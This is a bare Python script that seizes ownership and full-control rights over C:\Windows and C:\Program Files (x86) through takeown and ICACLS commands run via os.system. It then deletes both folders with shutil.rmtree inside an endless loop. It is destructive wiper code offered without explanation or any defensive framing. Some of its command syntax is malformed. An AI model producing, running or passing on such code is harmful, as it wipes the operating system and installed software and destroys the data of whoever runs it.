import shutil
import os

os.system('cmd /k "takeown /a /r /d Y /f C:\Windows"')
os.system('cmd /k "takeown /a /r /d Y /f C:\Program Files (x86)"')
os.system('cmd /k "ICACLS <C:\Windows> /grant administrators:F"')
os.system('cmd /k "ICACLS <C:\Program Files (x86)> /grant administrators:F"')

i = int (0)
path2 = (r"C:\Program Files (x86)")
path = (r"C:\Windows")
while i == 0:	
	shutil.rmtree(path)
	shutil.rmtree(path2)
